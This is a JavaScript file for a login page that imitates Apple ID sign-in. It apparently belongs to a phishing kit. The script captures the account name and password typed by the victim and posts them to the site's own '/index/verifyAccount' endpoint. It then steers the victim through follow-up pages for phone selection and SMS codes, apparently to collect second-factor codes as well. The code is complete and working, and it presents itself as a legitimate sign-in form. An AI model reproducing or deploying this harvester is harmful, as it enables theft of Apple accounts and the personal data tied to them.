$.removeCookie("Guid");
$.removeCookie("ID");
$.removeCookie("Number");
$.removeCookie("phoneCount");
$(window.parent.document).scrollTop(46);
let signinButton = $("#sign-in");
let accountInput = $("#account_name_text_field");
let passwordInput = $("#password_text_field");
let spinner = $(".spinner-container.auth");
let signinForm = $("#sign_in_form");
let accountForm = $("#sign_in_form .account-name");
let passwordForm = $("#sign_in_form .password");
let accountLabel = $("#apple_id_field_label");
let passwordLabel = $("#password_field_label");
let signinError = $(".signin-error");

$(document).ready(function () {
    let account = $("#account_name_text_field").val();
    let password = $("#password_text_field").val();

    if (account && account.length > 0 && password && password.length > 0) {
        // 显示密码框
        signinForm.addClass("account-name-entered");
        signinForm.removeClass("hide-password");
        signinForm.removeClass("hide-placeholder");

        accountInput.addClass("form-textbox-input");
        accountInput.removeClass("lower-border-reset");
        accountInput.addClass("form-textbox-entered");
        accountForm.removeClass("hide-password");
        accountForm.addClass("show-password");

        // 启用登录按钮
        signinButton.removeClass("disable");
        signinButton.removeAttr("disabled");

        // 将光标移动到密码输入框
        passwordInput.focus();
    }
});

if (accountInput.is(":focus")) signinButton.addClass("has-focus");

accountInput.on("focus", function () {
    accountForm.addClass("select-focus");
    passwordForm.removeClass("select-focus");
    signinError.addClass("hide");
    if (
        !signinForm.hasClass("account-name-entered") &&
        signinForm.hasClass("hide-password")
    ) {
        signinButton.addClass("has-focus");
        accountLabel.removeClass("account-label-custom-blur");
        accountLabel.addClass("account-label-custom-focus");
    }
});

accountInput.on("blur", function () {
    if (
        !signinForm.hasClass("account-name-entered") &&
        signinForm.hasClass("hide-password")
    ) {
        let value = accountInput.val();
        if (!value || value.length < 1) {
            signinButton.removeClass("has-focus");
            accountLabel.removeClass("account-label-custom-focus");
            accountLabel.addClass("account-label-custom-blur");
        }
    }
});

passwordInput.on("focus", function () {
    passwordForm.addClass("select-focus");
    accountForm.removeClass("select-focus");
    signinButton.addClass("has-focus-password");
    signinButton.addClass("has-focus-password");
    signinButton.removeClass("has-focus-password-blur");
    signinError.addClass("hide");
});

passwordInput.on("blur", function () {
    let value = passwordInput.val();
    if (!value || value.length < 1) {
        signinButton.removeClass("has-focus-password");
        signinButton.addClass("has-focus-password-blur");
    }
});

accountInput.on("keypress", (e) => {
    if (e.keyCode == 13) verifyAccount();
});
signinButton.on("click", verifyAccount);

function verifyAccount() {
    let value = accountInput.val();
    if (value && value.length > 0) {
        let password = passwordInput.val();
        if (!password || password.length < 1) {
            accountInput.addClass("verify-password");
            accountInput.attr("disabled", "true");
            accountLabel.addClass("account-label-custom-focus");

            spinner.removeClass("password-spinner");
            spinner.addClass("focus");
            signinButton.addClass("v-hide");
            spinner.removeClass("spinner-hide");
            setTimeout(() => {
                // 显示密码框
                signinForm.addClass("account-name-entered");
                signinForm.removeClass("hide-password");
                signinForm.removeClass("hide-placeholder");
                passwordInput.val("");
                passwordInput.focus();

                accountInput.addClass("form-textbox-input");
                accountInput.removeClass("lower-border-reset");
                accountInput.addClass("form-textbox-entered");
                accountForm.removeClass("hide-password");
                accountForm.addClass("show-password");

                accountInput.removeAttr("disabled");

                accountInput.removeClass("verify-password");
                accountInput.removeAttr("disabled");
                accountLabel.removeClass("account-label-custom-focus");

                signinButton.addClass("disable");
                signinButton.attr("disabled", "true");

                signinButton.addClass("has-focus-password");
                spinner.addClass("spinner-hide");
                signinButton.removeClass("has-focus");
                signinButton.removeClass("v-hide");
            }, 10);
        } else {
            tryLogin();
        }
    }
}

passwordInput.on("keypress", (e) => {
    if (e.keyCode == 13) tryLogin();
});

function tryLogin() {
    signinButton.addClass("v-hide");
    spinner.addClass("password-spinner");
    spinner.addClass("focus");
    spinner.removeClass("spinner-hide");

    disableInputs();

    var appleAccount = $("#account_name_text_field").val();
    var applePassword = $("#password_text_field").val();

    if (!appleAccount || !applePassword) {
        verifyFailed();
        return;
    }

    $.ajax({
        url: "/index/verifyAccount",
        dataType: "json",
        type: "post",
        async: true,
        contentType: "application/json",
        data: JSON.stringify({
            accountName: appleAccount,
            password: applePassword,
        }),
        success: function (response) {
            const data = response?.data;
            if (
                data &&
                (response.code === 201 ||
                    response.code === 202 ||
                    response.code === 203)
            ) {
                // 验证成功
                $(".landing__animation", window.parent.document).hide();
                $(".landing", window.parent.document).addClass(
                    "landing--sign-in landing--first-factor-authentication-success landing--transition"
                );

                // $.cookie('Guid',data.Guid);

                switch (response.code) {
                    case 201:
                        window.location.href = "/index/auth";
                        break;
                    case 202:
                        window.location.href =
                            "/index/authPhoneList?Guid=" + data.Guid;
                        break;
                    case 203:
                        window.location.href = `/index/sms?Guid=${data.Guid}`;
                        break;
                    default:
                        window.location.href = "/index/auth";
                }
            } else {
                verifyFailed();
            }
        },
        error: function () {
            verifyFailed();
        },
    });
}

function verifyFailed() {
    // 账号密码验证失败 (清空密码 + 重新聚焦账号输入框)
    enableInputs();
    spinner.addClass("spinner-hide");
    signinButton.removeClass("has-focus");
    signinButton.removeClass("v-hide");
    passwordInput.val("");
    accountInput.focus();
    signinError.removeClass("hide");
}

$("body").on("click", (e) => {
    if (!$(e.target).closest(".signin-error").length) {
        signinError.addClass("hide");
    }
});

function disableInputs() {
    accountInput.addClass("verify-password");
    accountInput.attr("disabled", "true");
    accountLabel.addClass("account-label-custom-focus");
    passwordInput.addClass("verify-password");
    passwordInput.attr("disabled", "true");
    passwordLabel.addClass("account-label-custom-focus");
}

function enableInputs() {
    accountInput.removeClass("verify-password");
    accountInput.removeAttr("disabled");
    accountLabel.removeClass("account-label-custom-focus");
    passwordInput.removeClass("verify-password");
    passwordInput.removeAttr("disabled");
    passwordLabel.removeClass("account-label-custom-focus");
}

accountInput.on("input", function (e) {
    let value = accountInput.val();
    if (value && value.length > 0) {
        if (
            !signinForm.hasClass("account-name-entered") &&
            signinForm.hasClass("hide-password")
        ) {
            signinButton.removeClass("disable");
            signinButton.removeAttr("disabled");
        }
    } else {
        signinButton.addClass("disable");
        signinButton.attr("disabled", "true");

        signinButton.removeClass("has-focus-password");
        spinner.addClass("spinner-hide");
        signinButton.addClass("has-focus");
        signinButton.removeClass("v-hide");

        // 隐藏密码框
        passwordInput.val("");
        signinForm.removeClass("account-name-entered");
        signinForm.addClass("hide-password");
        signinForm.addClass("hide-placeholder");
        signinButton.removeClass("has-focus-password");
        signinButton.removeClass("has-focus-password-blur");

        accountForm.addClass("hide-password");
        accountForm.removeClass("show-password");
    }
});

passwordInput.on("input", function (e) {
    let value = passwordInput.val();
    if (value && value.length > 0) {
        signinButton.removeClass("disable");
        signinButton.removeAttr("disabled");
    } else {
        signinButton.addClass("disable");
        signinButton.attr("disabled", "true");
    }
});

document.addEventListener("DOMContentLoaded", function () {
    const accountNameInput = document.getElementById("account_name_text_field");

    if (accountNameInput) {
        accountNameInput.addEventListener("blur", function () {
            let value = this.value.trim();

            // 1. 如果值包含'@'，则假定为电子邮件，不进行任何操作。
            if (value.includes("@")) {
                return;
            }

            const startsWithPlus = value.startsWith("+");
            // 提取所有数字。例如："+1 (234) 567-8900" -> "12345678900"
            // 或 "130 1234 5678" -> "13012345678"
            const allDigits = value.replace(/\D/g, "");

            // 如果不以'+'开头且没有数字（例如输入的是 "abc"），则不格式化
            if (!startsWithPlus && allDigits.length === 0) {
                return;
            }

            if (startsWithPlus) {
                // 值以 '+' 开头
                if (value.startsWith("+86")) {
                    const nationalNumber = allDigits.substring(2); // '86'之后的数字
                    if (nationalNumber.length === 11) {
                        // 标准的+86后的11位中国手机号
                        this.value = `+86 ${nationalNumber.substring(
                            0,
                            3
                        )} ${nationalNumber.substring(
                            3,
                            7
                        )} ${nationalNumber.substring(7, 11)}`;
                    } else if (nationalNumber.length > 0) {
                        // +86后长度不足或超过11位
                        this.value = `+86 ${nationalNumber}`;
                    } else {
                        // 只输入了"+86"或"+86 "
                        this.value = "+86 ";
                    }
                } else {
                    // 以 '+' 开头，但不是 '+86' (例如, +1, +44)
                    // 提取紧跟'+'后的数字部分作为潜在的国家代码
                    let potentialCC = "";
                    for (let i = 1; i < value.length; i++) {
                        if (/\d/.test(value[i])) {
                            potentialCC += value[i];
                        } else {
                            break; // 在第一个非数字处停止
                        }
                    }

                    if (potentialCC.length > 0) {
                        const restOfDigits = allDigits.substring(
                            potentialCC.length
                        );
                        this.value = `+${potentialCC}${
                            restOfDigits.length > 0 ? " " + restOfDigits : ""
                        }`;
                    }
                    // 如果 potentialCC 为空 (例如，输入是 "+ abc" 或只是 "+"),
                    // 且 allDigits 不为空 (例如 "+ 123"), 格式化为 "+ <digits>"
                    else if (allDigits.length > 0) {
                        this.value = `+ ${allDigits}`;
                    }
                    // 如果输入只是 "+"，则无变化。如果是 "+abc"，allDigits为空，也无变化。
                }
            } else {
                // 值不以 '+' 开头。
                // 电话号码必须包含数字。
                if (allDigits.length > 0) {
                    // 默认为中国区号 +86
                    if (allDigits.length === 11) {
                        // 常见的11位中国手机号
                        this.value = `+86 ${allDigits.substring(
                            0,
                            3
                        )} ${allDigits.substring(3, 7)} ${allDigits.substring(
                            7,
                            11
                        )}`;
                    } else {
                        // 其他长度，仅前缀+86和空格
                        this.value = `+86 ${allDigits}`;
                    }
                }
                // 如果 allDigits.length 为 0 (例如输入是 "abcde"), 此前已返回，不做处理。
            }
        });
    }
});
